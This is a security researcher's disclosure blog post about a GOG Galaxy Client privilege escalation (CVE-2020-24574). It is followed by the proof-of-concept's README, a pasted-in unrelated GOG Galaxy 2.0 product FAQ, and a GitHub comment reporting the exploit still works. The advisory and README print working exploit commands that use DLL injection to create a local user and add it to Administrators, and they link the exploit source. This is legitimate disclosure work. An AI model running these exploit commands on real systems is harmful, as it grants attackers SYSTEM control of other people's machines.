## [GOG Galaxy Client Local Privilege Escalation Deuce](/blog/2020-08-13-gog-galaxy_client-local-privilege-escalation_deuce/)

By [jtesta](/company/) on August 13, 2020

I reported [a serious local privilege escalation flaw in GOG Galaxy Client](https://www.positronsecurity.com/blog/2020-04-28-gog-galaxy-client-local-privilege-escalation/) on April 28, 2020, but my follow-up investigation (detailed below) found the vendor’s fix to be insufficient. By updating the proof-of-concept exploit code, it is possible to execute arbitrary commands as *SYSTEM* in GOG Galaxy Client v2.0.13 through ~~v2.0.15~~ v2.0.19 (the latest as of this writing).

GOG did not reply that this issue was officially fixed, although changes were silently made at some point after the v2.0.15 release to stop the provided proof-of-concept tools from working. ~~It is suspected that only minor changes were made to frustrate exploitation; an investigation is ongoing~~ (See update below).

UPDATE (Aug. 13, 2020 @ 5:11PM): After an investigation, it was found that GOG simply updated the signing key used for verifying messages. This key has been recovered, and the proof-of-concept has been updated with it. This advisory now describes a **0-day vulnerability in GOG Galaxy Client v2.0.19** because GOG did not respond in good faith with a proper patch in 90 days, as per [Google’s vulnerability disclosure policy](https://www.google.com/about/appsecurity/) (which GOG was made aware of during the initial contact; see Vendor Timeline, below).

UPDATE (Aug 25, 2020 @ 10:51PM): GOG released v2.0.20 that claims in the change log, “Security issue fix: Added checks that ensure the loaded .DLLs are genuine”. However, it was found that the proof-of-concept tool included in this advisory *still works, unmodified*. I contacted GOG.com Support to inform them of this, and their response on August 21 was: “The recent update to GOG GALAXY application (2.0.20) is unrelated to your report, it was released to address a different issue.” I do not know what different issue this was referring to. Also, the following CVE ID has been assigned to this issue: [CVE-2020-24574](https://nvd.nist.gov/vuln/detail/CVE-2020-24574)

### Investigation of Prior Patch

The day before issuing my [original advisory](https://www.positronsecurity.com/blog/2020-04-28-gog-galaxy-client-local-privilege-escalation/) on April 28, 2020, I ran the proof-of-concept exploits against the fixed versions (v1.2.67 and v2.0.14). They no longer worked. Unfortunately, because GOG never told me the issues were actually fixed on February 27, 2020, I didn’t have a chance to do an in-depth follow-up investigation before publishing the advisory. I’ve since had the chance to look at their fix more deeply.

To start, I looked at the log file at *C:\ProgramData\GOG.com\Galaxy\logs\GalaxyClientService.log* to see if it reports anything when the old exploit is run. I found this:

```
2020-05-08 15:03:53.503 [Information][#1 (1)] [TID 7352][galaxy_service]: Received a message from process connected at '127.0.0.1:54963'.
2020-05-08 15:03:53.503 [Information][#1 (1)] [TID 7352][galaxy_service]: Determined sender to be 'C:\Program Files\WindowsApps\PythonSoftwareFoundation.Python.3.7_3.7.2032.0_x64__qbz5n2kfra8p0\python.exe' (PID: 8448)
2020-05-08 15:03:53.503 [Warning][#1 (1)] [TID 7352][galaxy_service]: The sender was not recognized as a trusted client.
2020-05-08 15:03:53.503 [Error][#1 (1)] [TID 7352][galaxy_service]: Received a forbidden request from an untrusted sender. Disconnecting.

```

That’s a big hint! It looks like the privileged process, *GalaxyClientService.exe*, matches the network client’s source TCP port number with the executable process that opened the socket. That’s how it figures out that the request is coming from the Python interpreter instead of the legitimate client (GalaxyClient.exe).

I immediately thought that this check can be circumvented with [DLL injection](https://en.wikipedia.org/wiki/DLL_injection).

### Updating the Proof-of-Concept

*Cue hours of re-implementing my Python proof-of-concept in C…*

Ok, now I have a DLL that can be injected into *GalaxyClient.exe* which will issue the same HMAC-512-signed request as before. Let’s test it out:

```
C:\Users\user1\Desktop>galaxy_dll_inject_privesc.exe --key2 C:\Windows\System32\net.exe "user jtesta Abc*123Lol /add" "C:\\"
Starting GalaxyClientService...
Executing C:\Program Files (x86)\GOG Galaxy\GalaxyClient.exe...
PID of new GalaxyClient.exe process: 10296
Injecting DLL...
DLL injected.  Waiting up to 30 seconds for pipe server to start...
Connected to pipe server.  Sending command, args, and working directory...
Sent.  Waiting for response...

Success!

```

Looks like it worked! Ok, now let’s add this new user to the local *Administrators* group:

```
C:\Users\user1\Desktop>galaxy_dll_inject_privesc.exe --key2 C:\Windows\System32\net.exe "localgroup Administrators jtesta /add" "C:\\"
Starting GalaxyClientService...
Executing C:\Program Files (x86)\GOG Galaxy\GalaxyClient.exe...
PID of new GalaxyClient.exe process: 8112
Injecting DLL...
DLL injected.  Waiting up to 30 seconds for pipe server to start...
Connected to pipe server.  Sending command, args, and working directory...
Sent.  Waiting for response...

Success!

```

Let’s verify that this user exists and is part of the *Administrators* group:

```
C:\Users\user1\Desktop>net user jtesta
User name                    jtesta
[...]
Local Group Memberships      *Administrators       *Users
[...]
The command completed successfully.

```

**SUCCESS!**

### Proof-Of-Concept Exploit Tools

*UPDATE (Aug. 20, 2020 @ 5:17PM EST): a Github repository has been made to better track and manage updates: <https://github.com/jtesta/gog_galaxy_client_service_poc>*

Pre-compiled binaries and source code for the updated proof-of-concept tools (which work on GOG Galaxy v2.0.13 through v2.0.19) are available here: [gog\_galaxy\_updated\_poc\_v2.zip](/blog/gog_galaxy_updated_poc_v2.zip) ([gog\_galaxy\_updated\_poc\_v2.zip.sig](/blog/gog_galaxy_updated_poc_v2.zip.sig))

GPG Key: [jtesta.asc](/company/jtesta.asc) (9C61 F6A9 A3E9 BCA0 04A6 3C66 E44F 5FD3 B799 916A)

### Vendor Contact Timeline

**May 12, 2020**: Contact with GOG.com Support was made using the same ticket (#535258) as the [original advisory](https://www.positronsecurity.com/blog/2020-04-28-gog-galaxy-client-local-privilege-escalation/).

**June 4, 2020**: GOG.com Support replied with:

“I was informed that our Developers are working on fixing the issue, but executing the attack requires the machine to be already compromised.”

Because this sounded like GOG was not taking the issue seriously, I responded with:

“It is indeed true that an attacker must have low-privilege access to the machine already. But the problem is that this can be escalated into Administrator rights by abusing the GalaxyClientService software. […] Local privilege escalation (LPE) is a serious vulnerability. GOG customers may install software/games from other untrusted sources without Administrator rights, which normally would protect them from full system compromise. Unfortunately, due to the vulnerabilities I’ve discovered in GalaxyClientService, *all* user accounts are effectively administrators.”

**August 13, 2020**: No response received from vendor after 90 days, as per [Google’s vulnerability disclosure policy](https://www.google.com/about/appsecurity/) (which GOG was informed of). GOG did not reply with any fix information.

UPDATE (Aug. 13, 2020 @ 5:11PM): *After* this advisory was publicly released, GOG.com Support responded with:

“Our Developers reevaluated the reported issue and think that it will take them around 3 months to create a solution, because it demands a major design change. Would it be possible to postpone the public release of your findings by 3 months so they have time to implement and test this solution?”

Because this was received after the advisory was already published, the request was deemed moot.

### Explanation of 0-Day Exploit Release

(Section added on Aug. 13, 2020 @ 5:11PM)

As of the time of original publication (the morning of August 13), the proof-of-concept tool released worked on v2.0.13 - v2.0.15 only; it did not work on the latest version (v2.0.19) for unknown reasons. Hours later, an investigation revealed that GOG silently updated the message-signing key some time between the release of v2.0.16 and v2.0.19 in order to prevent the exploit from working. This was not a good-faith attempt at addressing the security vulnerability for two reasons:

1.) As [my first GOG Galaxy Client advisory clearly showed](https://www.positronsecurity.com/blog/2020-04-28-gog-galaxy-client-local-privilege-escalation/), secret keys cannot be used to verify messages, since an attacker can easily extract those keys. GOG already knew since January that this would not solve the core design problem.

2.) In private communication on May 12, I made note that I strongly suspected this would require an extensive re-design, and that I would be happy to help (for free) to ensure that a proper & comprehensive fix would be shipped to end users. No response regarding this offer was received (in fact, no response was received at all until the deadline had passed).

Because it reasonably seems that GOG is no longer acting in good-faith regarding this matter, I’ve updated the proof-of-concept again with the new signing key. Hence, as of August 13, **this is a 0-day vulnerability affecting GOG Galaxy Client v2.0.19**.

## Description

The client (aka GalaxyClientService.exe) in GOG GALAXY 2.0.19 allows local privilege escalation from any authenticated user to SYSTEM by instructing the Windows service to execute arbitrary commands. This occurs because the attacker can inject a DLL into GalaxyClient.exe, defeating the TCP-based "trusted client" protection mechanism.

# GOG Galaxy Client Service Proof-of-Concept Exploit

This is a proof-of-concept exploit for [GOG Galaxy Client](https://www.gog.com/galaxy) v2.0.12 - v2.0.20. It exploits the following vulnerabilities:

| CVE ID | Reference | Fixed? |
| --- | --- | --- |
| [CVE-2020-7352](https://nvd.nist.gov/vuln/detail/CVE-2020-7352) | <https://www.positronsecurity.com/blog/2020-04-28-gog-galaxy-client-local-privilege-escalation/> | Yes, in v2.0.13 |
| [CVE-2020-24574](https://nvd.nist.gov/vuln/detail/CVE-2020-24574) | <https://www.positronsecurity.com/blog/2020-08-13-gog-galaxy_client-local-privilege-escalation_deuce/> | **NO** |

Interestingly, on August 19, 2020, GOG released v2.0.20 with the change log that states, *"Security issue fix: Added checks that ensure the loaded .DLLs are genuine"*. However, the v2 exploit, reported publicly on August 13, *still works!* This was reported to GOG support personnel, who responded on August 21 with: "The recent update to GOG GALAXY application (2.0.20) is unrelated to your report, it was released to address a different issue." It is unknown what vulnerability this update addresses.

As of this writing (August 25, 2020), this proof-of-concept is a **zero-day exploit** against the latest version of GOG Galaxy (v2.0.20).

## Example

To create a new user, then add that user to the local `Administrators` group, execute the following two commands:

```
galaxy_dll_inject_privesc.exe --key2 C:\Windows\System32\net.exe "user jtesta Abc*123Lol /add" "C:\\"
galaxy_dll_inject_privesc.exe --key2 C:\Windows\System32\net.exe "localgroup Administrators jtesta /add" "C:\\"

```

To verify that the administrator user was successfully created, execute `net user jtesta`:

```
User name                    jtesta
[...]
Local Group Memberships      *Administrators       *Users
[...]
The command completed successfully.

```

## Compiling From Source

The MinGW toolchain on Linux is necessary. Install the prerequisites with:

```
  # apt install build-essential gcc-mingw-w64-i686

```

Then simply type `make` to compile.

## FAQ

* ### What is GOG GALAXY 2.0 and why should I use it?

  GOG GALAXY 2.0 is an application, thanks to which you’ll be able to combine multiple libraries into one and connect with your friends across all gaming platforms, consoles included. If your games and gaming buddies are scattered between different launchers and platforms, this is a solution for you! Keeping track of all achievements earned by you and your friends, hours played, and games owned across platforms has never been this easy. And the application is entirely free, all you need is a GOG account to use it.
* ### How can I add my games to GOG GALAXY 2.0?

  In GOG GALAXY 2.0 you’re adding games through official and community created integrations. By connecting platforms, the data about the games you own is automatically imported to the application. On top of that you are also able to manually add single games even if they are not connected to any platform.
* ### Will GOG GALAXY 2.0 show all my games, or only those I have installed on my PC?

  Yes, GOG GALAXY 2.0 will show all your games from connected PC and console platforms… even if they are not currently installed.
* ### Do I still need to have other gaming clients installed on my PC?

  Yes, if you want to get access to any features specific to that platform, e.g. installing or auto-updating games, cloud saves, etc.
* ### Will I be able to customize my games library?

  Yes, our goal is to provide you with the most options possible to customize your games library. In GOG GALAXY 2.0, you’ll be able to create your own views based on different filters available in the app, tags that you’ll create on your own, and search queries you’ll come up with. Mix and match all of those options to create countless library views. Once you do, save them for quick access and automatic synchronization. On top of that, you can also manually edit the metadata of every game in your master games collection.
* ### How can I add my friends to GOG GALAXY 2.0?

  Like with games, in GOG GALAXY 2.0 adding friends begins with connecting platforms. By doing so, you can find other GOG GALAXY users who are your friends on the platforms or social networks you have connected.

  Additionally, you’ll be able to see non-GOG GALAXY users from friends lists of connected platforms – with an option to check their online status and chat with them cross-platform.
* ### What kind of stats and activities will GOG GALAXY 2.0 show me?

  You’ll see all your games from connected platforms together with your progress in each title – achievements you’ve earned and your game time. Also, for your GOG GALAXY friends, you’ll be able to see their online status and what games they are playing, with their achievements and time spent in each title.
* ### Will GOG GALAXY 2.0 spy on my computer?

  No. We’re not in the business of users’ data. GOG GALAXY 2.0 is only importing information from connected platforms – you always know what is imported through official integrations. Additionally we’ve made the community created integrations open-source, to ensure the transparency of imported data.

* ### What data does GOG GALAXY 2.0 share with other platforms?

  We don’t share any data with third parties.
* ### How can I delete my data from GOG GALAXY 2.0?

  Once you have disconnected a platform from GOG GALAXY 2.0, we will remove all your imported data from our servers.
* ### What are the community created integrations and how I can create one?

  We want to offer integrations with all possible gaming platforms. This is a challenging and time-consuming process, not only because these are technically complex projects, but they also require negotiations and agreements with partners. We want all our official integrations to be supported by respective platform holders, so we make sure they’re in-line with partners’ policies and that they’re safe.

  While we’re hard at work on adding more official integrations, we’ve decided to give you – the community – an opportunity to work on your own open source platform integrations. The documentation about how to build your own GOG GALAXY 2.0 integrations for various gaming platforms can be found [here](https://github.com/gogcom/galaxy-integrations-python-api).
* ### I’m a GOG.COM user, what’s new for me in GOG GALAXY 2.0?

  The whole client has been rebuilt from the ground up to be better and faster. All features for third party platforms work for GOG.COM. With the new games library, you’ll be able to filter, sort and add tags to customize your views and save them for easy access. Thanks to the new friends section, you’ll have a chance to track your friends progress in every GOG.COM game, as well as see what they are currently playing. On top of that, GOG GALAXY 2.0 will remain your optional client for GOG.COM games – features like auto-updates, cloud saves, cross-play, rollbacks and more stay the same as the GOG GALAXY you’re currently using. Once we include all features available in the current version of GOG GALAXY client to the 2.0 version, we will update everyone to the GOG GALAXY 2.0 application.
* ### How can I participate in the Open Beta?

  The Open Beta is already available and everybody is welcome to participate in it. To get access to GOG GALAXY 2.0 download the installer from www.gogalaxy.com. Once dowloaded, launch it and follow the instructions. GOG account and consent to GOG GALAXY 2.0 EULA are required to participate in the test. The GOG account is entirely free.
* ### I found a bug in GOG GALAXY 2.0, how can I report it?

  There is an "Report an issue" option in the app under settings icon. We also encourage you to tell us what you think about GOG GALAXY 2.0 via the "Share feedback" option, in the same settings menu.
* ### I’m a journalist/content creator and would like to get in touch with you, how I can contact you?

  Drop us an email at pr@gog.com and we’ll get back to you!

## Description

![@katanacrimson](https://avatars.githubusercontent.com/u/121707?u=7ae9c2bebcfab9033d0a8b9b967d45a7e20a2863&v=4&size=48)[katanacrimson](https://github.com/katanacrimson)opened [on Jan 22, 2021](https://github.com/jtesta/gog_galaxy_client_service_poc/issues/1#issue-792366903)

....Just in case anyone was wondering, the PoC still works on GOG Galaxy 2.0.35 (last tested as of time of wriitng this). Just compiled and tested it and was able to create a local user and add them to the local administrators group on a testbed system.

GOG has yet to fix the underlying issue, it seems. [CVE-2020-24574](https://github.com/advisories/GHSA-p249-vr5g-ff3h "CVE-2020-24574") is alive and well, yet.
